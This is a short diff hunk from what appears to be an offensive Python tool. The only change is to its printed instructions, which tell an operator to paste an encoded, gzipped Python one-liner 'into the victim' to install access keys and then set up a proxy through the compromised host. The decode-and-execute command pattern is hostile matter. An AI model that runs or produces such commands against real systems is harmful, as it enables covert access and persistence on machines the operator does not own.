@@ -62,12 +62,12 @@ def main():
     SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
     gzbased = gzbase(SCRIPT)
     cmd = "echo '%s'|base64 -d|gzip -d|python" % gzbased
-    print "[+] paste the following into the victim"
+    print "[+] paste the following into the victim as the user to install the keys to"
     print cmd
     f = tempfile.NamedTemporaryFile(delete=False)
     f.write(cmd)
     print "[+] This is also available to you in the file %s" % f.name
-    print "[*] Once this commmand is ran on sketch, run install_proxy.py <Proxyport> <Middle> <Edge> <User> <Key>"
+    print "[*] Once this commmand is ran on sketch as the user to install the keys to, run install_proxy.py <Proxyport> <Middle> <Edge> <User> <Key>"
 
 if __name__ == "__main__":
     main()
